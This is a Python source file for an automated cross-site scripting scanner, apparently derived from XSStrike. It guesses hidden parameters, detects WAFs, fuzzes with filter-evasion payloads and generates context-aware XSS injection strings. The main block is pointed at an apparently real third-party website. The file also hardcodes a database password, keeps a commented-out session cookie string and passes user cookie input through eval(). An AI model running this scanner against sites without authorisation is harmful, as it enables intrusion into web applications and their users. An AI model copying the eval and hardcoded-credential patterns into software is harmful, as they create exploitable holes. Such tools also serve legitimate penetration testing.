from urllib import parse
import mechanicalsoup
from html.parser import HTMLParser
from fuzzywuzzy import fuzz
import requests
from time import sleep
import re
import copy
import MySQLdb

cmd5 = ""
# 参数列表
paramnames = []
paramvalues = []

# 测试字符串
xsschecker = 'd3v'
# 遇到WAF暂停程序
sleep_delay = 0
# htmlparse
CURRENTLY_OPEN_TAGS = []  # 当前打开的标签
OPEN_EMPTY_TAG = ""  # 打开空标签，存储上下文
blacklist = ['html', 'body', 'br']
whitelist = ['input', 'textarea']
NUM_REFLECTIONS = 0  # Number of reflections
OCCURENCE_NUM = 0  # Occurence number
OCCURENCE_PARSED = 0  # Occurence parsed by the parser
#定位的位置
occur_number = []
occur_location = []
# browser设置
br = mechanicalsoup.Browser(
    user_agent='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'
)

tags = ['sVg', 'iMg', 'bOdY', 'd3v', 'deTails']  # HTML Tags
#报告
report = ""

# 模糊测试非恶意payload
fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%00nload=yyy>', '<z oNStart=confirm()>', '<z oNMousEDown=(((confirm)))()>', '<z oNMousEDown=(prompt)``>', '<EmBed sRc=//14.rs>',
'<EmBed sRc=\/\\14.rs>', '<z oNMoUseOver=yyy>', '<z oNMoUsedoWn=yyy>', '<z oNfoCus=yyy>', '<z oNsUbmit=yyy>', '<z oNToggLe=yyy>', '<z oNoRieNtATionChaNge=yyy>', '<z OnReaDyStateChange=yyy>',
'<z oNbEfoReEdiTFoCus=yyy>', '<z oNDATAsEtChangeD=yyy>', '<sVG x=y>', '<bODy x=y>', '<emBed x=y>', '<aUdio x=y>', '<sCript x=y z>', '<iSinDEx x=y>',
'<deTaiLs x=y>', '<viDeo x=y>', '<MaTh><x:link>', 'x<!--y-->z', '<test>', '<script>String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 41)</script>',
'">payload<br attr="', '&#x3C;script&#x3E;', '<r sRc=x oNError=r>', '<x OnCliCk=(prompt)()>click',
'<bGsOund sRc=x>']
# 事件
event_handlers = {
    'oNeRror': ['OBjEct', 'iMg', 'viDeo'],
    'oNloAd': ['sVg', 'bOdY'],
    'oNsTart': ['maRQuee'],
    'oNMoUseOver': ['d3v', 'IfRame', 'bOdY'],
    'oNfoCus': ['d3v', 'bOdY'],
    'oNCliCk': ['d3v', 'bOdY'],
    'oNMoUseOver': ['d3v', 'a', 'bOdY'],
    'oNToggLe': ['deTails']
}

# js函数
functions = [
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'co\u006efir\u006d()',
    '(prompt)``', 'a=prompt,a()']

# 隐藏参数列表
blind_params = ['redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source',
                'file',
                'frame', 'config', 'tst', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text',
                'load', 'email',
                'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href',
                'ref', 'data', 'input',
                'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword',
                'key', 'q', 'query', 'aid',
                'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid',
                'qid', 'rid', 'sid',
                'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head',
                'higher', 'lower', 'width',
                'height', 'add', 'result', 'log', 'demo', 'example', 'message']


# 测试目标是否可达  ok
def test_availability(target):
    global report
    try:
        br.get(target)
        report += '<p class="font-bold">可连接性：OK</p>'
        return False
    except Exception as e:
        report += '<p class="font-bold">可连接性：Error</p>'
        return True

# 获取返回内容 ok
def get_request(url, param_dict, GET, POST):
    sleep(sleep_delay)
    if GET:
        param_str = ""
        for k, v in param_dict.items():
            param_str += k + "=" + v + "&"
        resp = br.get(url, params=param_str[:-1])
    else:
        resp = br.post(url, data=param_dict)
    return str(resp.content)

# 替换payload ok
def change_payload(param_dict, plstring):
    for k, v in param_dict.items():
        if v == xsschecker:
            param_dict[k] = plstring
    return param_dict


# 参数猜测 ok
def param_finder(url, GET, POST):
    report = []
    for param in blind_params:  # 使用定义好的盲参测试
        if param not in paramnames:  # 盲参不在已知参数
            response = get_request(url, { param : xsschecker}, GET, POST)
            # if '\'%s\'' % xsschecker in response or '"%s"' % xsschecker in response or ' %s ' % xsschecker in response:  # 检测d3v在不在返回信息中
            if xsschecker in response:  # 检测d3v在不在返回信息中
                paramnames.append(param)
                paramvalues.append("")
                report.append(param)

    if len(report) == 0:
        return ('<p class="font-bold">Find Param  : Did Not Find </p>')
    else:
        return ('<p class="font-bold">Find Param  :' + str(report) + '</p>')


# WAF探测  ok
def WAF_detector(url, param_data, GET, POST):

    noise = parse.quote_plus('<script>confirm()</script>')  # 可以触发WAF的载荷

    try:
        get_request(url, {param_data: noise}, GET, POST)
        return ""
    except Exception as e:
        e = str(e)
        # 根据错误识别WAF
        if '406' in e or '501' in e:
            return 'Mod_Security'
        elif '999' in e:
            return'WebKnight'
        elif '419' in e:
            return 'F5 BIG IP'
        elif '403' in e:
            return 'Unknown'
        else:
            return ""



# 模糊函数
def  fuzzer(url, GET, POST):
    global report
    param_data = dict(zip(paramnames, paramvalues))
    report += '<p class="font-bold">Fuzz：</p>  <div class="body table-responsive">    <table class="table table-striped"> <thead> <tr><th>Fuzz</th>'
    for i in paramnames:
        report += "<th>" + i + "</th>"
    report += "</tr></thead><tbody>"

    for i in fuzzes:
        if i[0] == "<":
            report += "<tr><td><span><</span><span>" + i[1:] + "</span></td>"
        else:
            report += "<tr><td>" + i.replace("<", "<span><</span>") + "</td>"

        for p in paramnames:
            param_fuzz = copy.deepcopy(param_data)
            param_fuzz[p] = xsschecker
            sleep(sleep_delay)
            try:
                fuzzy = parse.quote_plus(i) # 编码payload
                param_data_injected = change_payload(copy.deepcopy(param_fuzz), fuzzy)
                response = get_request(url, param_data_injected, GET, POST)
                if i in response: # 返回值有payload则说明可用
                    report += "<td>Works</td>"
                else:
                    report += "<td>Filtered</td>"
            except: # 服务端错误 可能是WAF拦截
                report += "<td>Blocked</td>"
        report += "</tr>"
    report += "</tbody></table></div>"
    report_save()



    # for p in paramnames:
    #     param_data = dict(zip(paramnames, paramvalues))
    #     param_data[p] = xsschecker
    #     fuzzresult = ''
    #     for i in fuzzes:
    #         sleep(sleep_delay)
    #         try:
    #             fuzzy = parse.quote_plus(i) # 编码payload
    #             param_data_injected = change_payload(copy.deepcopy(param_data), fuzzy)
    #             response = get_request(url, param_data_injected, GET, POST)
    #             if i in response: # 返回值有payload则说明可用
    #                 fuzzresult += '{ "result" : "Works" , "fuzz" : "' + i + '"},'
    #             else:
    #                 fuzzresult += '{ "result" : "Filtered" , "fuzz" : "' + i + '"},'
    #         except: # 服务端错误 可能是WAF拦截
    #             fuzzresult += '{ "result" : "Blocked" , "fuzz" : "' + i + '"},'
    #
    #     result += ('"' + p + '":[' + fuzzresult[:-1] + '],')
    # global report
    # report += ('"Fuzz" : {' + result[:-1] + '}}')
    # report_save()


# 过滤器检查 ok
def filter_checker(url, param_data, GET, POST):
    global report
    report += '<p class="font-italic" style="margin-left: 10px">Filter Strength :'
    try:
        low_param = change_payload(copy.deepcopy(param_data), parse.quote_plus('<svg/onload=(confirm)()>'))
        sleep(sleep_delay)
        low_request = get_request(url, low_param, GET, POST)
        if '<svg/onload=(confirm)()>' in low_request:
            report += ' Low or None </p> <p style="margin-left: 15px">Payload : <span><</span><span>svg/onload=(confirm)()></span></p> <p style="margin-left: 15px">Efficiency : 100% </p>'
            report_save()
        else:
            medium_param = change_payload(copy.deepcopy(param_data), parse.quote_plus('<zz//onxx=yy>'))
            sleep(sleep_delay)
            medium_request = get_request(url, medium_param, GET, POST)
            if '<zz//onxx=yy>' in medium_request:
                report += ' Medium </p>'
            else:  # Printing high since result was not medium/low
                report += ' High </p>'
    except Exception as e:
        report += ' Server Error! ' + str(e) + '</p>'


# 定位器 ok
def locator(url, param_data, GET, POST):
    global report
    init_resp = get_request(url, copy.deepcopy(param_data), GET, POST)  # 获取服务端返回结果
    if (xsschecker in init_resp.lower()):
        global NUM_REFLECTIONS  # xsschecker出现的次数
        NUM_REFLECTIONS = init_resp.lower().count(xsschecker.lower())  # 统计出现的次数
        report += '<p class="font-italic" style="margin-left: 10px">Locator : "' + str(NUM_REFLECTIONS) + '</p>'
        # print('Number of reflections found: %i' % NUM_REFLECTIONS)
        for i in range(NUM_REFLECTIONS):
            global OCCURENCE_NUM
            OCCURENCE_NUM = i + 1
            scan_occurence(init_resp)  # 定位
            # 为下一次定位重置全局变量
            global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG
            ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []
            IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = False, False, False, False, False
            OCCURENCE_PARSED = 0
            OPEN_EMPTY_TAG = ""
    else:
        report += '<p class="font-italic" style="margin-left: 10px">Locator : Not Find </p>'

def scan_occurence(init_resp):
    # 解析响应以定位xsschecker的位置/上下文
    location = html_parse(init_resp)  # 调用解析器函数
    if location in ('script', 'html_data', 'start_end_tag_attr', 'attr'):
        occur_number.append(OCCURENCE_NUM)
        occur_location.append(location)
    # 对注释中的测试和别的不一样，所有放到头
    elif location == 'comment':
        occur_number.insert(0, OCCURENCE_NUM)  # inserting the occurence_num in start of the list
        occur_location.insert(0, location)  # same as above
    else:
        pass


# 解析器 ok
def html_parse(init_resp):
    parser = MyHTMLParser()  # 解析器初始化
    location = ''  # 包含位置的变量
    try:
        parser.feed(init_resp)  # 解析
    except Exception as e:  # 捕捉异常/错误
        location = str(e)  # 错误实际上就是位置
    return location

class MyHTMLParser(HTMLParser):
    def handle_comment(self, data):  # 处理注释
        global OCCURENCE_PARSED
        if (xsschecker.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if (OCCURENCE_PARSED == OCCURENCE_NUM):
                raise Exception("comment")

    def handle_startendtag(self, tag, attrs):  # 处理自结束标签
        global OCCURENCE_PARSED
        global OCCURENCE_NUM
        global OPEN_EMPTY_TAG
        if (xsschecker.lower() in str(attrs).lower()):
            OCCURENCE_PARSED += 1
            if (OCCURENCE_PARSED == OCCURENCE_NUM):
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")

    def handle_starttag(self, tag, attrs):  # 处理开始标签
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if (tag not in blacklist):
            CURRENTLY_OPEN_TAGS.append(tag)
        if (xsschecker.lower() in str(attrs).lower()):
            if (tag == "script"):
                OCCURENCE_PARSED += 1
                if (OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("script")
            else:
                OCCURENCE_PARSED += 1
                if (OCCURENCE_PARSED == OCCURENCE_NUM):
                    raise Exception("attr")

    def handle_endtag(self, tag):  # 处理结束标签
        global CURRENTLY_OPEN_TAGS
        global OPEN_TAGS
        global OCCURENCE_PARSED
        if (tag not in blacklist):
            try:
                CURRENTLY_OPEN_TAGS.remove(tag)
            except:
                pass

    def handle_data(self, data):  # 处理数据，标签之间的文本
        global OCCURENCE_PARSED
        if (xsschecker.lower() in data.lower()):
            OCCURENCE_PARSED += 1
            if (OCCURENCE_PARSED == OCCURENCE_NUM):
                try:
                    if (CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS) - 1] == "script"):
                        raise Exception("script")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")


# 尝试注入 ok
def inject(url, param_data, GET, POST):
    special = ''
    l_filling = ''
    e_fillings = ['%0a', '%09', '%0d', '+']  # 换行 Tab 回车 用在事件和“=”之间或者函数和“=”之间
    fillings = ['%0c', '%0a', '%09', '%0d', '/+/']  # 代替空格

    global report
    report += '<p class="font-italic" style="margin-left: 10px">Inject : </p>'

    for occurence_num, location in zip(occur_number, occur_location):
        # print("开始测试 NO.%s " % OCCURENCE_NUM)
        report += '<p style="margin-left: 15px" class="col-pink"> Test No.' + str(occurence_num) + '</p>'
        allowed = []
        # 测试"
        if test_filter_char('k"k', 'k"k', occurence_num, url, copy.deepcopy(param_data), GET, POST, action='nope'):
            report += '<p style="margin-left: 20px">Double Quotes :  Allowed </p>'
            # double_allowed = True
            allowed.append('"')
        elif test_filter_char('k"k', 'k&quot;k', occurence_num, url, copy.deepcopy(param_data), GET, POST, action='nope' ):
            report += '<p style="margin-left: 20px">Double Quotes  : Not Allowed (To &quot;)</p><p style="margin-left: 20px">HTML Encoding : Allowed</p>'
            # print('Double Quotes (") are not allowed.')
            # print('HTML Encoding detected i.e " --> &quot;')
            # HTML_encoding = True
        else:
            report += '<p style="margin-left: 20px"> Double Quotes : Not Allowed (To &quot;)</p>'
            # double_allowed = False



        # 测试'
        if test_filter_char('k\'k', 'k\'k', occurence_num, url, copy.deepcopy(param_data), GET, POST, action='nope'):
            report += '<p style="margin-left: 20px"> Single Quotes : Allowed</p>'
            # single_allowed = True
            allowed.append('\'')
        else:
            report += '<p style="margin-left: 20px">Single Quotes : Not Allowed</p>'
            # single_allowed = False

        # 测试<>
        if test_filter_char('<lol>', '<lol>', occurence_num, url, copy.deepcopy(param_data), GET, POST, action='nope'):
            report += '<p style="margin-left: 20px">Angular Brackets (<>) : Allowed</p>'
            angular_allowed = True
            allowed.extend(('<', '>'))
        else:
            report += '<p style="margin-left: 20px">Angular Brackets (<>) : Not Allowed</p>'
            angular_allowed = False

        # 测试&gt;
        if test_filter_char('k&gt;k', 'k&gt;k', occurence_num, url, copy.deepcopy(param_data), GET, POST,
                            action='nope') or test_filter_char('&gt;', '>', occurence_num, url, copy.deepcopy(param_data), GET, POST,
                                                               action='nope'):
            report += '<p style="margin-left: 20px">HTML Entities : Allowed</p>'
            entity_allowed = True
            allowed.append('entity')
        else:
            report += '<p style="margin-left: 20px">HTML Entities : Not Allowed</p>'
            entity_allowed = False


        #突破注释上下文
        if location == 'comment':
            # Trying to break out of HTML Comment context.
            prefix = '-->'
            suffixes = ['', '<!--']
            report += '<div class="body table-responsive">    <table class="table table-striped"> <thead> <tr><th>Payload</th><th>Efficiency</th><th>Location</th></tr></thead><tbody>'
            for suffix in suffixes:
                for tag in tags:
                    for event_handler, compatible in event_handlers.items():
                        if tag in compatible:
                            for filling, function, e_filling in zip(fillings, functions, e_fillings):
                                if event_handler == 'oNeRror':
                                    payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (
                                        prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler,
                                        e_filling,
                                        e_filling, function, l_filling, suffix)
                                elif tag == 'd3v':
                                    payload = '%s%s%s%s%s%s=%s%s%s%sthis' % (
                                        l_than, tag, filling, special, event_handler, e_filling, e_filling,
                                        function,l_filling, g_than)
                                else:
                                    payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (
                                        prefix, tag, filling, special, event_handler, e_filling, e_filling, function,
                                        l_filling, suffix)
                                test_filter_char(parse.quote_plus(payload), payload, occurence_num, url, copy.deepcopy(param_data),
                                                 GET, POST, action='do')
            report += '</tbody></table></div>'

        elif location == 'script':
            # Trying to break out of JavaScript context.
            prefix_suffix = {'\'-': '-\'', '\\\'-': '-\\\'', '\\\'-': '//\''}
            report += '<div class="body table-responsive">    <table class="table table-striped"> <thead> <tr><th>Payload</th><th>Efficiency</th><th>Location</th></tr></thead><tbody>'

            for prefix, suffix in prefix_suffix:
                for function in functions:
                    payload = prefix + function + suffix
                    test_filter_char(parse.quote_plus(payload), payload, occurence_num, url, copy.deepcopy(param_data), GET, POST,
                                     action='do')
            test_filter_char(parse.quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>',
                             occurence_num, url, copy.deepcopy(param_data), GET, POST, action='do')
            report += '</tbody></table></div>'


        #突破正文上下文
        elif location == 'html_data':
            # Trying to break out of Plaintext context.
            l_than, g_than = '', ''
            if angular_allowed:
                l_than, g_than = '<', '>'
            elif entity_allowed:
                l_than, g_than = '&lt;', '&gt;'
            else:
                report += '<p style="margin-left: 25px">Angular brackets (<>) are being filtered.</p> '

                # print('Angular brackets are being filtered. Unable to generate payloads.')
                continue

            report += '<div class="body table-responsive">    <table class="table table-striped"> <thead> <tr><th>Payload</th><th>Efficiency</th><th>Location</th></tr></thead><tbody>'
            for tag in tags:
                for event_handler, compatible in event_handlers.items():
                    if tag in compatible:
                        for filling, function, e_filling in zip(fillings, functions, e_fillings):
                            if event_handler == 'oNeRror':
                                payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (
                                    l_than, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling,
                                    e_filling, function, l_filling, g_than)
                            else:
                                payload = '%s%s%s%s%s%s=%s%s%s%s' % (
                                    l_than, tag, filling, special, event_handler, e_filling, e_filling, function,
                                    l_filling,g_than)
                            test_filter_char(parse.quote_plus(payload), payload, occurence_num, url, copy.deepcopy(param_data), GET,
                                             POST, action='do')
            report += '</tbody></table></div>'


        elif location == 'start_end_tag_attr' or location == 'attr':
            # Trying to break out of Attribute context.
            quote = which_quote(occurence_num, url, copy.deepcopy(param_data), GET, POST)

            if quote == '':
                prefix = ['/>']
                suffixes = ['<"', '<\'', '<br attr\'=', '<br attr="']

            elif quote in allowed:
                prefix = '%s>' % quote
                suffixes = ['<%s' % quote, '<br attr=%s' % quote]
                report += '<div class="body table-responsive">    <table class="table table-striped"> <thead> <tr><th>Payload</th><th>Efficiency</th><th>Location</th></tr></thead><tbody>'

                for suffix in suffixes:
                    for tag in tags:
                        for event_handler, compatible in event_handlers.items():
                            if tag in compatible:
                                for filling, function, e_filling in zip(fillings, functions, e_fillings):
                                    if event_handler == 'oNeRror':
                                        payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (
                                            prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler,
                                            e_filling, e_filling, function, l_filling, suffix)
                                    else:
                                        payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (
                                            prefix, tag, filling, special, event_handler, e_filling, e_filling,
                                            function,
                                            l_filling, suffix)
                                    test_filter_char(parse.quote_plus(payload), payload, occurence_num, url, copy.deepcopy(param_data),
                                                     GET, POST, action='do')
                report += '</tbody></table></div>'


            elif quote not in allowed and 'entity' in allowed:
                prefix = ''
                if quote == '\'':
                    prefix = '&apos;'
                    suffixes = ['&lt;&apos;', '&lt; attr=&apos;']
                elif quote == '"':
                    prefix = '&quote'
                    suffixes = ['&lt;&quote', '&lt;br attr=&quote']
                report += '<div class="body table-responsive">    <table class="table table-striped"> <thead> <tr><th>Payload</th><th>Efficiency</th><th>Location</th></tr></thead><tbody>'
                for suffix in suffixes:
                    for tag in tags:
                        for event_handler, compatible in event_handlers.items():
                            if tag in compatible:
                                for filling, function, e_filling in zip(fillings, functions, e_fillings):
                                    if event_handler == 'oNeRror':
                                        payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (
                                            prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler,
                                            e_filling, e_filling, function, l_filling, suffix)
                                    else:
                                        payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (
                                            prefix, tag, filling, special, event_handler, e_filling, e_filling,
                                            function,
                                            l_filling, suffix)
                                    test_filter_char(parse.quote_plus(payload), payload, occurence_num, url, copy.deepcopy(param_data),
                                                     GET, POST, action='do')
                report += '</tbody></table></div>'

            else:
                report += '<p style="margin-left: 25px">Quotes are being filtered </p>'
                continue



# 测试过滤的字符  ok
def test_filter_char(payload_to_check, payload_to_compare, occurence_num, url, param_data, GET, POST, action):
    global report
    check_string = 'XSSSTART' + payload_to_check + 'XSSEND'  # We are adding XSSSTART and XSSEND to make
    compare_string = 'XSSSTART' + payload_to_compare + 'XSSEND'  # the payload distinguishable in the response
    param_data_injected = change_payload(param_data, check_string)
    try:
        check_response = get_request(url, param_data_injected, GET, POST)
    except:
        check_response = ''
    success = False
    occurence_counter = 0  # Variable to keep track of which reflection is going through the loop
    # Itretating over the reflections
    for m in re.finditer('XSSSTART', check_response, re.IGNORECASE):
        occurence_counter += 1
        if occurence_counter == occurence_num:
            efficiency = fuzz.partial_ratio(check_response[m.start():m.start() + len(compare_string)].lower(),
                                        compare_string.lower())  # 使用模糊匹配，搜索匹配
            if efficiency == 100:
                if action == 'do':
                    if payload_to_compare[0] == "<" :
                        report += '<tr><td><span><</span><span>' + payload_to_compare[1:] + "</span></td><td>100%</td><td> </td></tr>"
                    else:
                        report += '<tr><td>' + payload_to_compare.replace("<","<span><</span>") + '</td><td>100%</td><td></td></tr>'
                    # report += '<p style="margin-left: 25px">Payload : <span><</span><span>' + payload_to_compare[1:] + '</span></p><p style="margin-left: 25px">Efficiency: 100%</p>'
                    # print('Payload: %s' % payload_to_compare)
                    # print('Efficiency: 100%%' )
                success = True
                break

            if efficiency > 90:
                if action == 'do':
                    if payload_to_compare[0] == "<" :
                        report += '<tr><td><span><</span><span>' + payload_to_compare[1:] + '</span></td><td>' + str(efficiency) + '%</td>'
                    else:
                        report += '<tr><td>' + payload_to_compare.replace("<","<span><</span>") + '</td><td>' + str(efficiency) + '%</td>'
                    # report += '<p style="margin-left: 25px">Payload : <span><</span><span>' + payload_to_compare[1:] + '</span></p><p style="margin-left: 25px">Efficiency":"' + str(efficiency) + '%</p>'
                    # print('Payload: %s' % payload_to_compare)
                    # print('Efficiency: %s' % efficiency)
                    try:
                        data_type = occur_location[occurence_num - 1]
                        if data_type == 'comment':
                            location_readable = 'inside a HTML comment '
                        elif data_type == 'html_data':
                            location_readable = 'as data or plaintext on the page'
                        elif data_type == 'script':
                            location_readable = 'as data in javascript'
                        elif data_type == 'start_end_tag_attr':
                            location_readable = 'as an attribute in an empty tag'
                        elif data_type == 'attr':
                            location_readable = 'as an attribute in an HTML tag'
                        else:
                            location_readable = 'indetermination'
                        report += '<td>' + location_readable + '</td></tr>'
                        # print('Location: %s' % location_readable)
                        break
                    except:
                        continue
    return success

#符号发现  ok
def which_quote(occurence_num, url, param_data, GET, POST):
    check_string = 'XSSSTART' + 'd3v' + 'XSSEND'
    compare_string = 'XSSSTART' + 'd3v' + 'XSSEND'
    param_data_injected = change_payload(param_data, check_string)
    try:
        check_response = get_request(url, param_data_injected, GET, POST)
    except:
        check_response = ''
    quote = ''
    occurence_counter = 0
    for m in re.finditer('XSSSTART', check_response, re.IGNORECASE):
        occurence_counter += 1
        if occurence_counter == occurence_num and (
                check_response[(m.start() - 1):m.start()] == '\'' or check_response[(m.start() - 1):m.start()] == '"'):
            return check_response[(m.start() - 1):m.start()]
        elif occurence_counter == occurence_num:
            return quote


# 开始检测
def start_check(url, GET, POST):
    global report
    for param_name in paramnames:
        # 组合所有参数名和值
        report += ('<div><p class="font-bold">' + param_name + '</p>')
        param_dict = dict(zip(paramnames, paramvalues))
        param_dict[param_name] = xsschecker
        filter_checker(url, copy.deepcopy(param_dict), GET, POST)  # 过滤器检查
        locator(url, copy.deepcopy(param_dict), GET, POST)  # 定位
        inject(url, copy.deepcopy(param_dict), GET, POST)  # 注入
        report += '</div>'
        del occur_number[:]
        del occur_location[:]

def report_save():

    global cmd5, report
    conn = MySQLdb.connect(host='127.0.0.1', user='root', passwd='liushaoxiong', db='xss_info', charset="utf8")
    cur = conn.cursor()
    cur.execute('insert into mainapp_history(conmd5,report) values(%s,%s)', (cmd5, report))
    conn.commit()
    cur.close()
    conn.close()
    quit()


def initator(url, method, args, paramfind, delay, cookie, conmd5):

    url = url
    global cmd5
    cmd5 = conmd5
    global report
    # 判断method
    if method == "GET":
        GET = True
        POST = False
    else:
        GET = False
        POST = True
    # 测试目标可用性
    if test_availability(target=url):
        return report
    report += ('<p class="font-bold">Method:' + method + '</p>')

    # 将参数格式化
    args = parse.parse_qs(args, keep_blank_values=True)
    for i, j in args.items():
        paramnames.append(i)
        paramvalues.append(j[0])

    # 添加cookie
    if (len(cookie) != 0):
        try:
            ck = eval("{\"" + cookie.replace(";", "\",\"").replace("=", "\":\"") + "\"}")
            br.set_cookiejar(requests.cookies.cookiejar_from_dict(ck))
            report += ('<p class="font-bold">Cookies : ' + cookie + '</p>')
        except:
            # print("Cookie 输入错误")
            report +=  '<p class="font-bold">Cookies : Input Error </p>'
    else:
        report += '<p class="font-bold">Cookies : Empty </p>'
    # 参数猜测
    if "True" in paramfind:
        report += param_finder(url, GET, POST)
    # 如果没有找到可提交的参数就退出
    if len(paramnames) == 0:
        report += '<p class="font-bold">Param : No Available Param </p>'
        report_save()
    else:
        report += ('<p class="font-bold">Param : ' + str(paramnames) + '</p>')
    # WAF探测
    WAF_name = WAF_detector(url, paramnames[0], GET, POST)
    if WAF_name != "":
        report += ('<p class="font-bold">WAF : ON </p> <p class="font-bold">WAF Name : ' + WAF_name +'</p>')
        global sleep_delay
        sleep_delay = int(delay)
        fuzzer(url, GET, POST)  # 模糊测试
    else:
        report += ('<p class="font-bold">WAF : OFF </p>')

    start_check(url, GET, POST)
    report_save()


if __name__ == "__main__":

    # target = "http://bsy.sz.bendibao.com/bsyList.aspx"
    target = "http://www.cqzskj.com/search.aspx"
    # cookie = "BAIDUID=46E5FAA8C5F9F3CC00D6444D8949D9D3:FG=1; BIDUPSID=46E5FAA8C5F9F3CC00D6444D8949D9D3; PSTM=1515914180; BD_UPN=12314753; BD_CK_SAM=1; BDRCVFR[bLbo9QmdyQn]=mk3SLVN4HKm; sugstore=1; B64_BOT=1; ispeed_lsm=2; PSINO=7; H_PS_PSSID=; H_PS_645EC=91ab7dOXuJDVM%2BMRqPoBfKRvJ7V%2BYH%2B6x9YHnO1RHoiNxQ9uGV3Zmj3Y3wsXheabqdfi; BDSVRTM=0"
    cookie = ""
    # method = "POST"
    method = "GET"
    # param_data = "keyword=123&searchname=办事搜索"
    param_data = ""
    initator(target, method, param_data, "True", 6, cookie, "adfadfasfasaaa")
